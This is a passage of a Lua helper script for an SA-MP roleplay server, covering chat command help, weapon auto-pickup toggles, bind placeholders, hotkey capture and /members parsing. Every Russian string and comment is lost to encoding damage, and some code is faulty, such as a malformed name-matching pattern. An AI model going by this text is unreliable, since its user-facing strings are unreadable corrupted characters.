	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[4] .. " [����� ����������/0 - �����] - �������� � ������� ��������� ���������", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[5] .. " [������ ��������/0 - ��������� �������� �������] - �������� � �������� ��������������� ��������� �� ����", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[6] .. " [0 - �������/1 - ����] - �������� � ������� �������� ��������", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[7] .. " [0 - ������� �����/1 - ���� ���������] - �������� �� ��������� �����", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[10] .. " [�������/�����] - ������� ����� � ��������� �����", 0xFFFF0000)
end

function cmd_commandhelp(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /commandhelp [�������/list]", 0xFFFF0000) return end

		if sparams == config_ini.Commands[1] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA/" .. config_ini.Commands[1] .. " [����������] [�������/0 - ���. �������] [1-3] - �������� � ���������� ��������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}1 - ��������(�) ������(�); 2 - �������� �� ������; 3 - ��������� ��������� � ���� ��������", 0xFFFF0000) end
		if sparams == config_ini.Commands[2] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[2] .. " [����� ����������/0 - �����] - �������� � ������ ������������� �������", 0xFFFF0000) end
		if sparams == config_ini.Commands[3] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[3] .. " [����� ����������/0 - �����] - �������� � ��������� ��������� ���������", 0xFFFF0000) end
		if sparams == config_ini.Commands[4] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[4] .. " [����� ����������/0 - �����] - �������� � ������� ��������� ���������", 0xFFFF0000) end
		if sparams == config_ini.Commands[5] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[5] .. " [������ ��������/0 - ��������� �������� �������] - �������� � �������� ��������������� ��������� �� ����", 0xFFFF0000) end
		if sparams == config_ini.Commands[6] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[6] .. " [0 - �������/1 - ����] - �������� � ������� �������� ��������", 0xFFFF0000) end
		if sparams == config_ini.Commands[7] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[7] .. " [0 - ������� �����/1 - ���� ���������] - �������� �� ��������� �����", 0xFFFF0000) end
		--if sparams == config_ini.Commands[8] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[8] .. "", 0xFFFF0000) end
		if sparams == config_ini.Commands[9] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[9] .. " [�����] - �������� ��������� ����� � ����� � �����", 0xFFFF0000) end
		if sparams == config_ini.Commands[10] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[10] .. " [�������/�����] - ������� ����� � ��������� �����", 0xFFFF0000) end
		if sparams == config_ini.Commands[11] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[11] .. " - ������������� � �������� ���������", 0xFFFF0000) end
		if sparams == config_ini.Commands[12] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[12] .. " [flash/shock/he/smoke/inc/tear] - ������� ��������� �������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}flash - �����-�������, shock - �������, he - ����������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}smoke - �������, inc - �������������, tear - �� ������������ �����", 0xFFFF0000) end
		if sparams == config_ini.Commands[13] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[13] .. " - �������� ��������� ����������", 0xFFFF0000) end
		if sparams == config_ini.Commands[14] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[14] .. " [0-33] ������� ���� �� ���������", 0xFFFF0000) end
		if sparams == config_ini.Commands[15] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[15] .. " - ��������� ������ ��", 0xFFFF0000) end
		if sparams == config_ini.Commands[16] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[16] .. " [id] - ��������� ������� ���������� ������ � /members", 0xFFFF0000) end
		if sparams == config_ini.Commands[17] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[17] .. " [id/���] - ��������� ���������� ������ �� ������� � �� ����� ��", 0xFFFF0000) end
		if sparams == config_ini.Commands[18] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[18] .. " [load/unload/sdok/vdok] - ��������� ��������� �������� �� ���� ��������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}load - �������� �������� ���������; unload - �������� ��������� ���������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}sdok - ������ � ��������� ������ �� ������� ������������; vdok - ������ � ������/��������", 0xFFFF0000) end
		if sparams == config_ini.Commands[19] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[19] .. " [�����] - ������� SMS ���������� �����������", 0xFFFF0000) end
		if sparams == config_ini.Commands[20] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[20] .. " - �������������� /members 1 � ���������� ����� � ���� ������ � ���������� �����", 0xFFFF0000) end
		if sparams == config_ini.Commands[21] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[21] .. " [0-45] - ���������� ��������� ������", 0xFFFF0000) end
		if sparams == config_ini.Commands[22] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[22] .. " [0-23] - ���������� ��������� �����", 0xFFFF0000) end
		--if sparams == config_ini.Commands[23] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[23] .. "", 0xFFFF0000) end
		--if sparams == config_ini.Commands[24] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[24] .. "", 0xFFFF0000) end
		if sparams == config_ini.Commands[25] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[25] .. " - ����������� ����� AFK", 0xFFFF0000) end
		--if sparams == config_ini.Commands[26] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[26] .. "", 0xFFFF0000) end
		if sparams == config_ini.Commands[27] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[27] .. " ([id]) - ������� ���� ��������� � ���� � ���� �������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���� ������� id �� ����, ����� ���������� �������� ����� ���������� ��������� � ���, ��� ������� ������ �� �����", 0xFFFF0000) end
		if sparams == config_ini.Commands[28] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[28] .. " ([id]) - �������� ������� (��� ��������� id) � �������������", 0xFFFF0000) end
		--if sparams == config_ini.Commands[29] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[29] .. "", 0xFFFF0000) end
		if sparams == "commandhelp" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/commandhelp [�������/list] - �������� ���������� �� ������� ��� ������ ��������� ������", 0xFFFF0000) end
		if sparams == "bugreport" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/bugreport [�����] - ��������� ��������� �� ������ ��� ����������� �� ��������� �������", 0xFFFF0000) end
		if sparams == "dokhelp" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/dokhelp - �������� ���������� � �������� ��������� � ���������", 0xFFFF0000) end
		if sparams == "mkv" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/mkv [�������/clear - ��������] - ��������� ������ ���������� mkv", 0xFFFF0000) end
		if sparams == "bkv" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/bkv [�������/clear - ��������] - ��������� ������ ���������� bkv", 0xFFFF0000) end
		if sparams == "lej" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/lej - [id1 (id2) (id3)/clear - ��������] - ��������� ������ ���������� lej", 0xFFFF0000) end
		if sparams == "show" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/show - �������� ������� ���� �������", 0xFFFF0000) end
		if sparams == "bp" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/bp - �������� ��������� ������ ��� ���������� (�� ������)", 0xFFFF0000) end
end

function cmd_lej(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /lej [id1 (id2) (id3)/clear - ��������]", 0xFFFF0000) return end
		if sparams == "clear" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� lej ������� �������", 0xFFFF0000) lastID.e = "none" return end
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� lej ������� ��������� �������� " .. sparams .. "", 0xFFFF0000) lastID.e = sparams return
end

function cmd_bkv(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /bkv [�������/clear - ��������]", 0xFFFF0000) return end
		if sparams == "clear" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� bkv ������� �������", 0xFFFF0000) lastKV.b = "none" return end
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� bkv ������� ��������� �������� " .. sparams .. "", 0xFFFF0000) lastKV.b = sparams return
end

function cmd_mkv(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /mkv [�������/clear - ��������]", 0xFFFF0000) return end
		if sparams == "clear" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� mkv ������� �������", 0xFFFF0000) lastKV.m = "none" return end
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� mkv ������� ��������� �������� " .. sparams .. "", 0xFFFF0000) lastKV.m = sparams return
end

function cmd_bp(sparams)
		if sparams ~= "deagle" and sparams ~= "shotgun"  and sparams ~= "smg" and sparams ~= "rifle" and sparams ~= "m4" and sparams ~= "par"  and sparams ~= "ot"  and sparams ~= "status" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /bp [deagle/shotgun/m4/smg/rifle/par/ot/status]", 0xFFFF0000) return end
		if sparams == "status" then
				local color = AutoDeagle and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}Desert eagle: {" .. color .. "}" .. tostring(AutoDeagle) .. "", 0xFFFF0000)
				local color = AutoShotgun and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}Shotgun: {" .. color .. "}" .. tostring(AutoShotgun) .. "", 0xFFFF0000)
				local color = AutoSMG and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}SMG: {" .. color .. "}" .. tostring(AutoSMG) .. "", 0xFFFF0000)
				local color = AutoRifle and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}Country Rifle: {" .. color .. "}" .. tostring(AutoRifle) .. "", 0xFFFF0000)
				local color = AutoM4A1 and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}M4A1: {" .. color .. "}" .. tostring(AutoM4A1) .. "", 0xFFFF0000)
				local color = AutoPar and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������: {" .. color .. "}" .. tostring(AutoPar) .. "", 0xFFFF0000)
				local color = AutoOt and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������: {" .. color .. "}" .. tostring(AutoOt) .. "", 0xFFFF0000)
		end

		if sparams == "deagle" then AutoDeagle = not AutoDeagle local color = AutoDeagle and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ Desert Eagle ���������� ��: {" .. color .. "}" .. tostring(AutoDeagle) .. "", 0xFFFF0000) end
		if sparams == "shotgun" then AutoShotgun = not AutoShotgun local color = AutoShotgun and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ Shotgun ���������� ��: {" .. color .. "}" .. tostring(AutoShotgun) .. "", 0xFFFF0000) end
		if sparams == "smg" then AutoSMG = not AutoSMG local color = AutoSMG and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ SMG ���������� ��: {" .. color .. "}" .. tostring(AutoSMG) .. "", 0xFFFF0000) end
		if sparams == "rifle" then AutoRifle = not AutoRifle local color = AutoRifle and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ Country Rifle ���������� ��: {" .. color .. "}" .. tostring(AutoRifle) .. "", 0xFFFF0000) end
		if sparams == "m4" then AutoM4A1 = not AutoM4A1 local color = AutoM4A1 and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ M4A1 ���������� ��: {" .. color .. "}" .. tostring(AutoM4A1) .. "", 0xFFFF0000) end
		if sparams == "par" then AutoPar = not AutoPar local color = AutoPar and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ �������� ���������� ��: {" .. color .. "}" .. tostring(AutoPar) .. "", 0xFFFF0000) end
		if sparams == "ot" then AutoOt = not AutoOt local color = AutoOt and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������� ���������� ��: {" .. color .. "}" .. tostring(AutoOt) .. "", 0xFFFF0000) end
end

function cmd_cars()
	 	if table.maxn(carsident) == 0 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}� ������� ������� �� �� �������� � ����������� ����������.", 0xFFFF0000) return end
		lua_thread.create(
				function()
						if not showdialog(0, "������ � �������������", "{FFFAFA}������ ������ ����� ��� ���������� ���������� � ������ ����������� ������ � ������� �� �������� �� ���� ���.\n���� ������ - ������ ���������� �������������� ���������� � �����-���� ������� ��� ������ ��� ������.\n���� ��� �������� ������ - ������� ����� � ������� ��� ��������� ��� ����� (��������: \"������ � ��\", ��� \"����� � ������������\").\n� ��������� ������ ���������� ������ � ������� ��� ������ ����������� (�������� \"�����������\"), ��� ������� \"������\" ���,\n����� ����������� ��� ������ ��� ��� �� ������ � ������� � � ������ � ���������� ����������.\n���� � ������ ��� �������� � �� ������ ������, �� ��� ��� ����� ���������� ������ ������ � ����� ������ ��� ID.\n��� ���� ����� �������� ������� �������� ������ � ����� ����� ������ \"��������\"\n��� ����, ����� ���������� ������� ������ (������� ��� ������������ ���������� ������ ��������� ������, � �� ������), �������� ������ ����� ������.", "����������") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
						local res = waitForChooseInDialog(0)
						local tempdelarr = {}
						local result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
						local name = ""
						if result then name = sampGetPlayerNickname(id) end
						for k, v in pairs(carsident) do
								local driver = ""
								if v.drivername ~= "0" then
										driver = v.drivername
										local did = sampGetPlayerIdByNickname(driver)
										if did ~= nil then
												local clist = string.sub(string.format('%x', sampGetPlayerColor(did)), 3)
												local clist = clist == "ffff" and "fffafa" or clist
												driver = "{" .. clist .. "}" .. driver .. "[" .. tostring(did) .. "]{fffafa}"
										end
								else
										driver = "�����������"
								end

								if not showdialog(1, "�������������", "��� ������: " .. v.namecar .. "\nCID ������: " .. tostring(k) .. " (������, ���� CID > 1000 �� ������ ����� ��� ������/���������/����������� ������������ ������ � ������������ ��� �� ����������)\n���� ����������: " .. tostring(v.time) .. "\n��������: " .. driver .. "", "�����", "��������") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								local res = waitForChooseInDialog(1)
								if res == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ��� �������.", 0xFFFF0000) return end
								if res == "" then
										sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ���� ���������.", 0xFFFF0000)
								else
										sendtolog("ID ������: " .. tostring(k) .. ", �������: " .. res .. "", 0)
								end

								carsident[k] = nil
						end
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ��� ��������. ������� �� ��������������.", 0xFFFF0000)
				end
		)

end

--[[ function cmd_cars() -- ������� ������������
		 if table.maxn(carsident) == 0 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}� ������� ������� �� �� �������� � ����������� ����������.", 0xFFFF0000) return end
		 lua_thread.create(
				 function()
						 if not showdialog(0, "������ � �������������", "{FFFAFA}������ ������ ����� ��� ���������� ���������� � ������ ����������� ������ � ������� �� �������� �� ���� ���.\n���� ������ - ������ ���������� �������������� ���������� � �����-���� ������� ��� ������ ��� ������.\n���� ��� �������� ������ - ������� ����� � ������� ��� ��������� ��� ����� (��������: \"������ � ��\", ��� \"����� � ������������\").\n� ��������� ������ ���������� ������ � ������� ��� ������ ����������� (�������� \"�����������\"), ��� ������� \"������\" ���,\n����� ����������� ��� ������ ��� ��� �� ������ � 瘘������� � � ������ � ���������� ����������.\n���� � ������ ��� �������� � �� ������ ������, �� ��� ��� ����� ���������� ������ ������ � ����� ������ ��� ID.\n��� ���� ����� �������� ������� �������� ������ � ����� ����� ������ \"��������\"\n��� ����, ����� ���������� ������� ������ (������� ��� ������������ ���������� ������ ��������� ������, � �� ������), �������� ������ ����� ������.", "����������") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
						 local res = waitForChooseInDialog(0)
						 local tempdelarr = {}
						 local result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
						 local name = ""
						 if result then name = sampGetPlayerNickname(id) end
						 if not showdialog(1, "�������������", "��� ������:", "�����", "��������") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
						 local res = waitForChooseInDialog(1)
						 if res == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ��� �������.", 0xFFFF0000) return end
						 if res == "" then
							 sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ���� ���������.", 0xFFFF0000)
							 return
						 else
							 local str = ""
							 for k, v in pairs(carsident) do
								 wait(0)
								 str = str == "" and "[" .. tostring(k) .. "] = \"" .. res .. "\", " or "" .. str .. "[" .. tostring(k) .. "] = \"" .. res .. "\", "
								 sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����: id ������ " .. tostring(k) .. ", �������: " .. res .. ".", 0xFFFF0000)
							 end
							 sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ��� ��������. ������� �� ��������������.", 0xFFFF0000)
							 print(str)
							 str = ""
							 carsident = {}
						 end
				 end
		 )

end ]]

function formatbind(str)
		local str = tostring(str)
		local rarr = {}
		if str:match("@Hour@") then str = str:gsub("@Hour@", os.date("%H")) end
		if str:match("@Min@") then str = str:gsub("@Min@", os.date("%M")) end
		if str:match("@Sec@") then str = str:gsub("@Sec@", os.date("%S")) end
		if str:match("@Date@") then str = str:gsub("@Date@", os.date("%d.%m.%Y")) end
		if str:match("@KV@") then str = str:gsub("@KV@", kvadrat()) end
		if str:match("@NearID@") then str = str:gsub("@NearID@", getclosest("id")) end
		if str:match("@NearFName@") then str = str:gsub("@NearFName@", getclosest("fname")) end
		if str:match("@NearSName@") then str = str:gsub("@NearSName@", getclosest("sname")) end
		if str:match("@MyID@") then str = str:gsub("@MyID@", tostring(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))) end
		if str:match("@clist@") then str = str:gsub("@clist@", config_ini.UserClist[clists[getplayercolor(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))]]) end
		if str:match("@enter@") then str = str:gsub("@enter@", "\n") end
		if str:match("@tid@") then if lastTargetID ~= -1 then str = str:gsub("@tid@", tostring(lastTargetID)) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ID ��������� ����.", 0xFFFF0000) return nil end end
		for v in str:gmatch('[^\n]+') do table.insert(rarr, v) end
		if rarr[1] == nil then rarr[1] = str end
		return rarr
end

function getclosest(param)
		local car, ped = storeClosestEntities(PLAYER_PED)
		local result, id = sampGetPlayerIdByCharHandle(ped)
		if result then
				if param == "id" then return id end
				local nick = sampGetPlayerNickname(id)
				local fname, sname = nick:match("(a%)_(a%)")
				if param == "fname" then return fname else return sname end
		else
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ID ����������� ������", 0xFFFF0000)
				return "false"
		end
end

function ismegaphone()
		if isCharOnFoot(PLAYER_PED) then return false end
		local carhandle = storeCarCharIsInNoSave(PLAYER_PED)-- ��������� handle ����������
		if carhandle < 0 then return false end
		local cid = select(2, sampGetVehicleIdByCarHandle(carhandle))
		if cIDs[cid] ~= nil and (cIDs[cid] == "����� ��" or cIDs[cid] == "����� ��" or cIDs[cid] == "������� �����������" or cIDs[cid] == "������� ��" or cIDs[cid] == "������� ��" or cIDs[cid] == "������� ��" or cIDs[cid] == "FBI" or cIDs[cid] == "���� ��" or cIDs[cid] == "�.�.�.�.") then return true end
		return false
end


function string.split(str, delim, plain) -- bh FYP
   local tokens, pos, plain = {}, 1, not (plain == false) --[[ delimiter is plain text by default ]]
   repeat
       local npos, epos = string.find(str, delim, pos, plain)
       table.insert(tokens, string.sub(str, pos, npos and npos - 1))
       pos = epos and epos + 1
   until not pos
   return tokens
end

function strunsplit(str, delim)
   local str = string.split(str, " ")
   local estr = {[1] = ""}
   local A_Index = 1
   for k, i in ipairs(str) do
        if #estr[A_Index] + #i > delim then A_Index = A_Index + 1 estr[A_Index] = "" end    
        estr[A_Index] = estr[A_Index] == "" and i or "" .. estr[A_Index] .. " " .. i .. "" 
   end
    
   return estr
end

function imgui.Hotkey(name, numkey, width)
		imgui.BeginChild(name, imgui.ImVec2(width, 30), true)
		imgui.PushItemWidth(width)

		local hstr = ""
		for _, v in ipairs(string.split(config_ini.HotKey[numkey], ", ")) do
				if v ~= "0" then
						hstr = hstr == "" and tostring(vkeys.id_to_name(tonumber(v))) or "" .. hstr .. " + " .. tostring(vkeys.id_to_name(tonumber(v))) .. ""
				end
		end
		hstr = (hstr == "" or hstr == "nil") and "���" or hstr

		imgui.Text(u8(hstr))
		imgui.PopItemWidth()
		imgui.EndChild()
		if imgui.IsItemClicked() then
				lua_thread.create(
						function()
							local curkeys = ""
							local tbool = false
							while true do
									wait(0)
									if not tbool then
											for k, v in pairs(vkeys) do
													sv = tostring(v)
													if isKeyDown(v) and (v == vkeys.VK_MENU or v == vkeys.VK_CONTROL or v == vkeys.VK_SHIFT or v == vkeys.VK_LMENU or v == vkeys.VK_RMENU or v == vkeys.VK_RCONTROL or v == vkeys.VK_LCONTROL or v == vkeys.VK_LSHIFT or v == vkeys.VK_RSHIFT) then
															if v ~= vkeys.VK_MENU and v ~= vkeys.VK_CONTROL and v ~= vkeys.VK_SHIFT then
																	if not curkeys:find(sv) then
																			curkeys = tostring(curkeys):len() == 0 and sv or curkeys .. " " .. sv
																	end
															end
													end
											end

											for k, v in pairs(vkeys) do
													sv = tostring(v)
													if isKeyDown(v) and (v ~= vkeys.VK_MENU and v ~= vkeys.VK_CONTROL and v ~= vkeys.VK_SHIFT and v ~= vkeys.VK_LMENU and v ~= vkeys.VK_RMENU and v ~= vkeys.VK_RCONTROL and v ~= vkeys.VK_LCONTROL and v ~= vkeys.VK_LSHIFT and v ~=vkeys. VK_RSHIFT) then
														 	if not curkeys:find(sv) then
																	curkeys = tostring(curkeys):len() == 0 and sv or curkeys .. " " .. sv
																	tbool = true
															end
													end
											end
									else
											tbool2 = false
											for k, v in pairs(vkeys) do
													sv = tostring(v)
													if isKeyDown(v) and (v ~= vkeys.VK_MENU and v ~= vkeys.VK_CONTROL and v ~= vkeys.VK_SHIFT and v ~= vkeys.VK_LMENU and v ~= vkeys.VK_RMENU and v ~= vkeys.VK_RCONTROL and v ~= vkeys.VK_LCONTROL and v ~= vkeys.VK_LSHIFT and v ~=vkeys. VK_RSHIFT) then
															tbool2 = true
															if not curkeys:find(sv) then
																	curkeys = tostring(curkeys):len() == 0 and sv or curkeys .. " " .. sv
															end
													end
											end

											if not tbool2 then break end
									end
							end

							local keys = ""
							if tonumber(curkeys) == vkeys.VK_BACK then
									config_ini.HotKey[numkey] = "0"
							else
									local tNames = string.split(curkeys, " ")
									for _, v in ipairs(tNames) do
											local val = (tonumber(v) == 162 or tonumber(v) == 163) and 17 or (tonumber(v) == 160 or tonumber(v) == 161) and 16 or (tonumber(v) == 164 or tonumber(v) == 165) and 18 or tonumber(v)
											keys = keys == "" and val or "" .. keys .. ", " .. val .. ""
									end
							end

							config_ini.HotKey[numkey] = keys
						end
				)
		end
end

function makeHotKey(numkey)
		local rett = {}
		for _, v in ipairs(string.split(config_ini.HotKey[numkey], ", ")) do
				if tonumber(v) ~= 0 then table.insert(rett, tonumber(v)) end
		end
		return rett
end

function showdialog(style, title, text, button1, button2)
		if isDialogActiveNow then return false end
		sampShowDialog(9048, title, text, button1, button2, style)
	 	isDialogActiveNow = true
		return true
end

function getMembersText()
		refmem1.status, refmem1.text = true, ""
		sampSendChat("/members 1")
		while refmem1.text == "" do wait(0) end
		local Members1Text = refmem1.text
		refmem1.status, refmem1.text = false, ""

		local temparr = {}
		local delarr = {}
		if memb_ini.players == nil then memb_ini.players = {} end
		
		for v in Members1Text:gmatch('[^\n]+') do 
			local id, name, zv, rank = v:match("%[%d+%] %[(%d+)%] ([%a_]+)	(%W*) %[(%d+)%].*") 
			if zv ~= nil then 
				temparr[name] = zv
				memb_ini.players[name] = zv 
			end 
		end -- ��������� ������� ������� �� ��������� ������
		
		for k, v in pairs(memb_ini.players) do if temparr[k] == nil and sampGetPlayerIdByNickname(k) ~= nil then table.insert(delarr, k) end end -- ��������� ������� ��� � ������� ���, ��� ������ �� � members � ������ ��� ����
		
		for i = 0, 1000 do if sampIs3dTextDefined(2048 - i) then sampDestroy3dText(2048 - i) end end
		
		for k, v in ipairs(delarr) do memb_ini.players[v] = nil end -- ������� � ��� ���� ��� �� � ��� ���
		
		inicfg.save(memb_ini, "members")
		return Members1Text
end

function waitForChooseInDialog(style)
		if style ~= 0 and style ~= 1 and style ~= 2 then return nil end
		while sampIsDialogActive(9048) do wait(100) end
		local result, button, list, input = sampHasDialogRespond(9048)
		returnWalue = style == 1 and input or list
		isDialogActiveNow = false
		if style == 0 or button == 0 then return nil end
		return returnWalue
end

function sampGetPlayerIdByNickname(nick)
		local _, myid = sampGetPlayerIdByCharHandle(playerPed)
    if tostring(nick) == sampGetPlayerNickname(myid) then return myid end
    for i = 0, 1000 do if sampIsPlayerConnected(i) and sampGetPlayerNickname(i) == tostring(nick) then return i end end
end

function sampGetPlayerSkin(id)
    if not id or not sampIsPlayerConnected(tonumber(id)) and not tonumber(id) == select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)) then return false end -- ��������� ��������
    local isLocalPlayer = tonumber(id) == select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)) -- ���������, �������� �� ���� ��������� �������
    local result, handle = sampGetCharHandleBySampPlayerId(tonumber(id)) -- �������� CharHandle �� SAMP-ID
    local result, handle = sampGetCharHandleBySampPlayerId(tonumber(id)) -- �������� CharHandle �� SAMP-ID
    if not result and not isLocalPlayer then return false end -- ���������, ������� �� ��� CharHandle
    local skinid = getCharModel(isLocalPlayer and PLAYER_PED or handle) -- �������� ���� ������ CharHandle
    if skinid < 0 or skinid > 311 then return false end -- ��������� ���������� ������ �����, ������ ID ������������ ������ SAMP
    return true, skinid -- ���������� ������ � ID �����
end

function imgui.TextColoredRGB(text)
